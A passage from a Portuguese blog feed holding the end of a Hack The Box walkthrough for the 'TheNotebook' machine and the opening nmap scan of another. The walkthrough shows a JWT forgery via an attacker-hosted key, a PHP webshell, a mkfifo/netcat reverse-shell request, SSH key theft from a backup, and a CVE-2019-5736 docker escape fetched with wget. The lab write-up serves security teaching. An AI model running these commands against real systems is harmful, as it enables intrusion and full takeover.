  </span><span class="nl">"kid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:7070/privKey.key"</span><span class="w">
</span><span class="p">}</span><span class="err">.</span><span class="p">{</span><span class="w">
  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jdoe"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jdoe@dummy.com"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"admin_cap"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span><span class="p">}</span><span class="err">.</span><span class="p">[</span><span class="err">Signature</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<p>O fato neste momento é: Não podemos modificar o token emitido sem assiná-lo novamente com a mesma chave presente no servidor, porém, uma vez que o token traz consigo a URI da chave utilizada para sua assinatura e validação, pode ser que tenhamos alguma chance recriando este token, assinando com uma chave RSA própria e <strong>publicá-la para que o backend possa acessá-lo</strong>, mas isso só poderemos confirmar testando :stuck_out_tongue_winking_eye:.</p>

<h2 id="acesso-inicial">Acesso inicial</h2>

<p>Uma vez que precisamos criar um token, buscando por uma forma simples de fazê-lo, encontrei uma biblioteca em python chamada <a href="https://pyjwt.readthedocs.io/en/stable/">PyJWT</a> que me pareceu bem simples de ser utilizada. Na página inicial da documentação temos um exemplo demonstrando o processo de assinatura de um token simples, porém precisamos validar como adicionar o header necessário (neste caso o valor <code class="language-plaintext highlighter-rouge">kid</code>) e criar o certificado.</p>

<p>Alcancei o objetivo acima a partir da execução dos seguintes passos:</p>

<ul>
  <li>Criação da chave RSA conforme linhas de comando abaixo. Teremos como output o conteúdo da chave pública e, no arquivo especificado, a chave privada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req <span class="nt">-nodes</span> <span class="nt">-new</span> <span class="nt">-x509</span> <span class="nt">-keyout</span> privKey.key <span class="nt">-noout</span> <span class="nt">-pubkey</span>
</code></pre></div></div>

<ul>
  <li>Publicação da chave utilizando um python HTTP Server simples, a ser especificado no token, para que o webserver busque pelo menos durante o processo de validação.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 7070
</code></pre></div></div>

<ul>
  <li>
    <p>Após a criação da chave, criado um script, conforme conteúdo abaixo, utilizando os valores dos arquivos de chave pública e privada e assinando o payload. Este script utiliza exemplos da página <a href="https://pyjwt.readthedocs.io/en/stable/usage.html">Usage Examples</a> da documentação oficial da biblioteca.</p>

    <ul>
      <li>Necessário instalar o modulo utilizado com o comando <code class="language-plaintext highlighter-rouge">pip3 install pyjwt</code>. Caso o module <code class="language-plaintext highlighter-rouge">jwt</code> esteja instalado, necessário removê-lo antes da instalação deste módulo</li>
    </ul>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">jwtprivate_key</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"""</span><span class="s">-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDT/8rR3ZkWJOJN
[...]
XDmj7j8p7kdd2ZM1MYTO6A0=
-----END PRIVATE KEY-----</span><span class="sh">"""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">jdoe</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">jdoe@dummy.com</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">admin_cap</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1</span>
<span class="p">}</span>
<span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">kid</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://10.10.10.10:7070/privKey.key</span><span class="sh">"</span><span class="p">}</span>
<span class="n">encoded</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="sh">"</span><span class="s">RS256</span><span class="sh">"</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>
</code></pre></div></div>

<p>Um exemplo do output se encontra abaixo, o que pode ser validado conforme exemplo abaixo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 generate-jwt.py
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjoxfQ.WMokYjjMMECoF2UWM2fcMVcR99X34dHXwuj8nXqBlQWOnwC1NdBoO6PD-ZHjAZ5p969Jbf4XnRKZedAAokxvIgG2ymYNV1F8CcDzDfuHlMlk_CiYGvimoJWgvA3S-24KDql2bRrvJgoPbKKjqJ5Ir7mWZF1USGSwsttc9Ff1qniFAWTJ8CXkTLtfR498_rY_uIJfBdvqTbi3C9fWJcnSwjCGROkEGxCYve4cf5rjFvm_D_G5-S8oWkXICYAFp5lMQ288E0qGQp04nD16H1v2YzOROolNDeqMVB2uaI060xjKEA8mv6taa095q7rEqzpzXSj21Uq2-xcZonk0LI1-yg
</code></pre></div></div>

<ul>
  <li>O token gerado pelo conteúdo acima, conforme JWT.ms, gerou o payload abaixo:</li>
</ul>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"typ"</span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"kid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://10.10.10.10:7070/privKey.key"</span><span class="w">
</span><span class="p">}</span><span class="err">.</span><span class="p">{</span><span class="w">
    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jdoe"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jdoe@dummy.com"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"admin_cap"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="p">}</span><span class="err">.</span><span class="p">[</span><span class="err">Signature</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>Uma vez que os parâmetros foram gerados conforme esperado, é chegado o momento de alterar o valor do cookie no navegador e <strong>:boom:</strong>: um request do backend foi recebido no HTTP server para validar a sua assinatura e agora podemos ver a opção <strong>Admin Panel</strong> ao acessar o portal :smile:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 7070Serving HTTP on 0.0.0.0 port 7070 <span class="o">(</span>http://0.0.0.0:7070/<span class="o">)</span> ...10.10.10.230 - - <span class="o">[</span>10/Jun/2021 18:45:24] <span class="s2">"GET /privKey.key HTTP/1.1"</span> 200 -
</code></pre></div></div>

<p><img src="https://i.imgur.com/NrGXJx9.png" alt="HTB TheNotebook - Admin Panel" class="align-center" /></p>

<ul>
  <li>Analisando o conteúdo do que é possível se fazer na aplicação a partir do painel administrativo, temos duas opções básicas: listar as notas existentes e realizar o upload de um arquivo.</li>
</ul>

<p><img src="https://i.imgur.com/fSYkzLZ.png" alt="HTB TheNotebook - Admin Options" class="align-center" /></p>

<ul>
  <li>Analisando a seção <em>View Notes</em>, pudemos listar todas as notas da aplicação, conforme abaixo. Destaque para as notas do usuário <strong>admin</strong> que cita a existência de backup deste servidor e que existe uma <strong>vulnerabilidade de arquivos PHP sendo executados</strong> pelo servidor de apresentação:</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Title</th>
      <th>Note</th>
      <th>Owner</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Need to fix config</td>
      <td>Have to fix this issue where PHP files are being executed :/. This can be a potential security issue for the server.</td>
      <td>admin</td>
    </tr>
    <tr>
      <td>Backups are scheduled</td>
      <td>Finally! Regular backups are necessary. Thank god it’s all easy on server.</td>
      <td>admin</td>
    </tr>
    <tr>
      <td>The Notebook Quotes</td>
      <td>“I am nothing special, of this I am sure. I am a common man with common thoughts and I’ve led a common life. There are no monuments dedicated to me and my name will soon be forgotten, but I’ve loved another with all my heart and soul, and to me, this has always been enough..” ― Nicholas Sparks, The Notebook “So it’s not gonna be easy. It’s going to be really hard; we’re gonna have to work at this everyday, but I want to do that because I want you. I want all of you, forever, everyday. You and me… everyday.” ― Nicholas Sparks, The Notebook “You can’t live your life for other people. You’ve got to do what’s right for you, even if it hurts some people you love.” ― Nicholas Sparks, The Notebook “You are, and always have been, my dream.” ― Nicholas Sparks, The Notebook “You are my best friend as well as my lover, and I do not know which side of you I enjoy the most. I treasure each side, just as I have treasured our life together.” ― Nicholas Sparks, The Notebook “I love you. I am who I am because of you. You are every reason, every hope, and every dream I’ve ever had, and no matter what happens to us in the future, everyday we are together is the greatest day of my life. I will always be yours. “ ― Nicholas Sparks, The Notebook “We fell in love, despite our differences, and once we did, something rare and beautiful was created. For me, love like that has only happened once, and that’s why every minute we spent together has been seared in my memory. I’ll never forget a single moment of it.” ― Nicholas Sparks, The Notebook</td>
      <td>noah</td>
    </tr>
    <tr>
      <td>Is my data safe?</td>
      <td>I wonder is the admin good enough to trust my data with?</td>
      <td>noah</td>
    </tr>
  </tbody>
</table>

<p>Já que possivelmente arquivos do tipo PHP sejam interpretados pelo servidor, decidi realizar um teste, onde os passos abaixo foram executados:</p>

<ul>
  <li>
    <p>Acessando a opção <em>File Upload</em> temos uma página simples para envio de arquivos, a qual vamos inspecionar as requisições a partir do Burp Suite</p>

    <p><img src="https://i.imgur.com/fgI2wmr.png" alt="HTB TheNotebook - File Upload" class="align-center" /></p>

    <ul>
      <li>
        <p>Criando um payload PHP para webshell simples com o conte conteúdo <code class="language-plaintext highlighter-rouge">&lt;?php system($_GET['cmd']);?&gt;</code>, tentei realizar seu upload a partir do formulário e não tive nenhum tipo de bloqueio nesta ação.</p>
      </li>
      <li>
        <p>Após upload, o arquivo foi listado na página e no botão <em>View</em> relacionado, o caminho onde poderia acessar o conteúdo enviado.</p>
      </li>
    </ul>

    <p><img src="https://i.imgur.com/aCdIwnN.png" alt="HTB TheNotebook - Uploaded Files" class="align-center" /></p>

    <ul>
      <li>Ao copiar a URI deste arquivo, realizando chamadas simples com o queryString <code class="language-plaintext highlighter-rouge">cmd=id</code>, conforme previsto no payload criado, pude constatar que poderíamos obter um shell reverso deste modo já que obtemos execução remota de código :smiley:</li>
    </ul>

    <p><img src="https://i.imgur.com/eSH3rQY.png" alt="HTB TheNotebook - Simple WebShell" class="align-center" /></p>

    <ul>
      <li>Por fim, para obter um shell reverso em si, iniciei um listener usando o <code class="language-plaintext highlighter-rouge">nc</code> e executei a chamada abaixo, onde obtive o sucesso esperado :smile:</li>
    </ul>
  </li>
</ul>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/1e49f8a12603040cc99b2dd39f423b09.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.10.10+4443+&gt;/tmp/f</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.230</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjoxfQ.WMokYjjMMECoF2UWM2fcMVcR99X34dHXwuj8nXqBlQWOnwC1NdBoO6PD-ZHjAZ5p969Jbf4XnRKZedAAokxvIgG2ymYNV1F8CcDzDfuHlMlk_CiYGvimoJWgvA3S-24KDql2bRrvJgoPbKKjqJ5Ir7mWZF1USGSwsttc9Ff1qniFAWTJ8CXkTLtfR498_rY_uIJfBdvqTbi3C9fWJcnSwjCGROkEGxCYve4cf5rjFvm_D_G5-S8oWkXICYAFp5lMQ288E0qGQp04nD16H1v2YzOROolNDeqMVB2uaI060xjKEA8mv6taa095q7rEqzpzXSj21Uq2-xcZonk0LI1-yg; uuid=d3f32390-d9e4-4eb0-b1a0-788b54fd8278</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<p>Após obter o shell reverso, iniciada enumeração da máquina com a conta <code class="language-plaintext highlighter-rouge">www-data</code>, a qual é utilizada para execução do webserver. Os seguintes itens foram listados após execução do <code class="language-plaintext highlighter-rouge">linpeas.sh</code>:</p>

<ul>
  <li>
    <p>Usuários com console e suas permissões</p>

    <ul>
      <li><code class="language-plaintext highlighter-rouge">noah:x:1000:1000:Noah:/home/noah:/bin/bash</code></li>
      <li><code class="language-plaintext highlighter-rouge">root:x:0:0:root:/root:/bin/bash</code></li>
    </ul>
  </li>
  <li>
    <p>Existência da pasta <code class="language-plaintext highlighter-rouge">/var/backups</code>, inclusive mencionada durante as notas obtidas anteriormente</p>
  </li>
</ul>

<p>Com este item também foi mencionado nas notas encontradas na aplicação, iniciando pela inspeção dos arquivos em <code class="language-plaintext highlighter-rouge">/var/backups</code>, notei que temos alguns arquivos aos quais não temos acesso, porém um deles me chamou a atenção, sendo o arquivo <code class="language-plaintext highlighter-rouge">home.tar.gz</code>, com acesso de leitura global, possivelmente contendo algum tipo de informação.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@thenotebook:/var/backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 696
drwxr-xr-x  2 root root     4096 Jun 11 06:26 <span class="nb">.</span>
drwxr-xr-x 14 root root     4096 Feb 12 06:52 ..
<span class="nt">-rw-r--r--</span>  1 root root    51200 Jun 11 06:25 alternatives.tar.0
<span class="nt">-rw-r--r--</span>  1 root root    33252 Feb 24 08:53 apt.extended_states.0
<span class="nt">-rw-r--r--</span>  1 root root     3609 Feb 23 08:58 apt.extended_states.1.gz
<span class="nt">-rw-r--r--</span>  1 root root     3621 Feb 12 06:52 apt.extended_states.2.gz
<span class="nt">-rw-r--r--</span>  1 root root      437 Feb 12 06:17 dpkg.diversions.0
<span class="nt">-rw-r--r--</span>  1 root root      172 Feb 12 06:52 dpkg.statoverride.0
<span class="nt">-rw-r--r--</span>  1 root root   571460 Feb 24 08:53 dpkg.status.0
<span class="nt">-rw-------</span>  1 root root      693 Feb 17 13:18 group.bak
<span class="nt">-rw-------</span>  1 root shadow    575 Feb 17 13:18 gshadow.bak
<span class="nt">-rw-r--r--</span>  1 root root     4373 Feb 17 09:02 home.tar.gz
<span class="nt">-rw-------</span>  1 root root     1555 Feb 12 06:24 passwd.bak
<span class="nt">-rw-------</span>  1 root shadow   1024 Feb 12 07:33 shadow.bak
</code></pre></div></div>

<p>Ao extrair o conteúdo deste arquivo, notado que temos algumas informações importantes que vão nos ajudar a obter acesso com a conta do usuário <code class="language-plaintext highlighter-rouge">noah</code>, sendo este um backup de seu home directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xzvf</span> home.tar.gz
home/
home/noah/
home/noah/.bash_logout
home/noah/.cache/
home/noah/.cache/motd.legal-displayed
home/noah/.gnupg/
home/noah/.gnupg/private-keys-v1.d/
home/noah/.bashrc
home/noah/.profile
home/noah/.ssh/
home/noah/.ssh/id_rsa
home/noah/.ssh/authorized_keys
home/noah/.ssh/id_rsa.pub
</code></pre></div></div>

<p>Executando o comando abaixo, com o arquivo obtido do backup, foi possível conectar-se via ssh com a conta <code class="language-plaintext highlighter-rouge">noah</code> e obter a flag de user</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa noah@10.10.10.230
noah@thenotebook:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>Como de costume, antes de refazer a enumeração com <code class="language-plaintext highlighter-rouge">linenum.sh</code>, executado o comando <code class="language-plaintext highlighter-rouge">sudo -l</code> na máquina, o que retornou o seguinte conteúdo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noah@thenotebook:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>noah on thenotebook:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User noah may run the following commands on thenotebook:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/docker <span class="nb">exec</span> <span class="nt">-it</span> webapp-dev01<span class="k">*</span>
</code></pre></div></div>

<p>Uma vez que tínhamos acesso para executar quaisquer comandos para este container em execução, <code class="language-plaintext highlighter-rouge">webapp-dev01</code>, segui com a execução do comando abaixo, o que me permitiu conectar como <code class="language-plaintext highlighter-rouge">root</code> dentro do container.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/docker <span class="nb">exec</span> <span class="nt">-it</span> webapp-dev01 bash
</code></pre></div></div>

<p>No conteúdo deste container, temos os arquivos utilizados na publicação do website, onde vamos buscar por informações sensíveis</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@7228ddf52a0f:/opt/webapp# <span class="nb">ls</span> <span class="nt">-la</span>
total 2244
drwxr-xr-x 1 root root    4096 Jun 11 07:04 <span class="nb">.</span>
drwxr-xr-x 1 root root    4096 Feb 12 07:30 ..
drwxr-xr-x 1 root root    4096 Feb 12 07:30 __pycache__
drwxr-xr-x 3 root root    4096 Nov 18  2020 admin
<span class="nt">-rw-r--r--</span> 1 root root    3303 Nov 16  2020 create_db.py
<span class="nt">-rwxr-xr-x</span> 1 root root 2236814 Jun 11 07:04 main
<span class="nt">-rw-r--r--</span> 1 root root    9517 Feb 11 15:00 main.py
<span class="nt">-rw-------</span> 1 root root    3247 Feb 11 15:09 privKey.key
<span class="nt">-rw-r--r--</span> 1 root root      78 Feb 12 07:12 requirements.txt
drwxr-xr-x 3 root root    4096 Nov 19  2020 static
drwxr-xr-x 2 root root    4096 Nov 18  2020 templates
<span class="nt">-rw-r--r--</span> 1 root root      20 Nov 20  2020 webapp.tar.gz
</code></pre></div></div>

<p>Analisando especificamente o conteúdo do arquivo <code class="language-plaintext highlighter-rouge">create_db.py</code> notei que temos dois hashes de senha para os usuários <code class="language-plaintext highlighter-rouge">noah</code> e <code class="language-plaintext highlighter-rouge">admin</code>, os quais decidi buscar na internet se já haviam sido resolvidos.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">users</span> <span class="o">=</span> <span class="p">[</span>
        <span class="nc">User</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span> <span class="n">email</span><span class="o">=</span><span class="sh">'</span><span class="s">admin@thenotebook.local</span><span class="sh">'</span><span class="p">,</span> <span class="n">uuid</span><span class="o">=</span><span class="n">admin_uuid</span><span class="p">,</span> <span class="n">admin_cap</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="sh">"</span><span class="s">0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68</span><span class="sh">"</span><span class="p">),</span>
        <span class="nc">User</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="sh">'</span><span class="s">noah</span><span class="sh">'</span><span class="p">,</span> <span class="n">email</span><span class="o">=</span><span class="sh">'</span><span class="s">noah@thenotebook.local</span><span class="sh">'</span><span class="p">,</span> <span class="n">uuid</span><span class="o">=</span><span class="n">noah_uuid</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="sh">"</span><span class="s">e759791d08f3f3dc2338ae627684e3e8a438cd8f87a400cada132415f48e01a2</span><span class="sh">"</span><span class="p">)</span>
    <span class="p">]</span>
</code></pre></div></div>

<p>Como não encontrei estas hashes em nenhum site público (Crackstation, por exemplo) significa que não devem ser senhas de wordlists conhecidas, como a <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, frequentemente utilizada em CTFs. Decidi então partir para enumeração de possíveis vulnerabilidades de <em>docker breakout</em>, ou seja, escapar do container para o host docker.</p>

<p>Buscando por alguns materiais, encontrei o repositório <a href="https://github.com/stealthcopter/deepce">stealthcopter/deepce: Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) (github.com)</a> onde o script promete auxiliar na enumeração de características vulneráveis que permita esse tipo de ação.</p>

<p>Ao executá-lo no container, notei que tínhamos alguma chance dada alguns capabilities (em vermelho na imagem) que permitiriam que tanto realizasse a leitura como também a escrita de arquivos no host, porém após múltiplas tentativas não obtive o sucesso esperado.</p>

<p><img src="https://i.imgur.com/0L7480D.png" alt="HTB TheNotebook - deepce output" class="align-center" /></p>

<p>Como não encontrei nada muito relevante nos arquivos, decidi buscar por outras vulnerabilidades que permitiriam escapar do docker, onde acabei encontrando o CVE-2019-5736 enquanto navegava nas vulnerabilidades relacionadas ao produto <strong>docker</strong> no site [CVE Details]. Esta vulnerabilidade menciona justamente o que procuramos e dado ao seu alto score (CVSS 9.3) talvez exista algum exploit pronto.</p>

<p><img src="https://i.imgur.com/CqvPKK3.png" alt="CVE Details - CVE-2019-5736" class="align-center" /></p>

<p>Buscando por exploits encontrei o repositório <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">Frichetten/CVE-2019-5736-PoC: PoC for CVE-2019-5736 (github.com)</a> uma PoC escrita em Golang que supostamente se adequaria bem em nosso cenário, uma vez que outras PoCs existentes dependiam da execução do <code class="language-plaintext highlighter-rouge">docker run</code> como root.</p>

<p>Para obter o shell de root, os passos seguintes foram executados, conforme visto neste blog post (<a href="https://www.programmersought.com/article/71804432772/">Reproduction of docker escape vulnerability (CVE-2019-5736) - Programmer Sought</a>)</p>

<ul>
  <li>
    <p>Baixado e editado o script com o payload para execução de shell reverso, chamado <code class="language-plaintext highlighter-rouge">escape.go</code></p>
  </li>
  <li>
    <p>Compilado utilizando os parâmetros selecionados</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build escape.go
</code></pre></div></div>

<ul>
  <li>Copiado exploit para a máquina vítima, dentro do container, seguido da sua execução</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.10.10/escape
<span class="nb">chmod</span> +x escape
./escape
</code></pre></div></div>

<ul>
  <li>Uma vez que o exploit substitui <code class="language-plaintext highlighter-rouge">/bin/sh</code> da máquina por um shell script malicioso, executado a linha de comando a seguir para iniciar o trigger para a exploração</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/docker <span class="nb">exec</span> <span class="nt">-it</span> webapp-dev01 /bin/sh
</code></pre></div></div>

<p>Após execução, foi recebido um shell reverso no listener que havia sido iniciado e obtido flag de root desta máquina</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lnvp</span> 8080
listening on <span class="o">[</span>any] 8080 ...
connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.230] 35856
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1617<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
&lt;4de4eaff90e275467ff2103ff7b6eb2b1ffaf63d44f72a2b2# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@thenotebook:/root# <span class="nb">cat </span>root.txt
<span class="se">\c</span>at root.txt
&lt;redacted&gt;
</code></pre></div></div>

<p>Espero que tenham gostado!</p>

<p>Vejo voces no proximo post! :smiley:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Medium" /><category term="HTB Linux" /><summary type="html"><![CDATA[Olá pessoal! A máquina desta semana será TheNotebook, outra máquina Linux classificada como mediana do Hack The Box, criada por mostwanted002.]]></summary></entry><entry><title type="html">Walktrough: HTB Ophiuchi</title><link href="https://davicruz.com/walkthrough/2021/07/htb-ophiuchi" rel="alternate" type="text/html" title="Walktrough: HTB Ophiuchi" /><published>2021-07-03T13:00:00-03:00</published><updated>2021-07-03T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/07/htb-ophiuchi</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/07/htb-ophiuchi"><![CDATA[<p>Olá pessoal!</p>

<p>A máquina desta semana será <strong>Ophiuchi</strong>, outra máquina Linux classificada como mediana do <a href="https://www.hackthebox.eu/">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/27390">felamos</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.</p>

<p><img src="https://i.imgur.com/RgW95kn.png" alt="htb-ophiuchi" class="align-center" /></p>

<p>Recentemente tenho iniciado os trabalhos nas máquinas do HTB por pesquisar sobre seu nome, pois ele ou a imagem podem “dar dicas” sobre como realizar a exploração.</p>

<p>Ao buscar <code class="language-plaintext highlighter-rouge">define ophiuchi</code> no Google fui redirecionado para <code class="language-plaintext highlighter-rouge">define ophiucus</code>, que é uma constelação e seu nome em Português é <em>Serpentário</em>, o que faz algum sentido dado a imagem que temos um planeta e algumas estrelas, mas em breve veremos que não é apenas isso! :smiley:</p>

<h2 id="enumeração">Enumeração</h2>

<p>Começamos a enumeração, como de costume, executando scan rápido no <code class="language-plaintext highlighter-rouge">nmap</code> para identificar os serviços publicados nesta máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.227
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-27 17:32 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.227
Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee <span class="o">(</span>RSA<span class="o">)</span>
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 <span class="o">(</span>ED25519<span class="o">)</span>
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.18 seconds
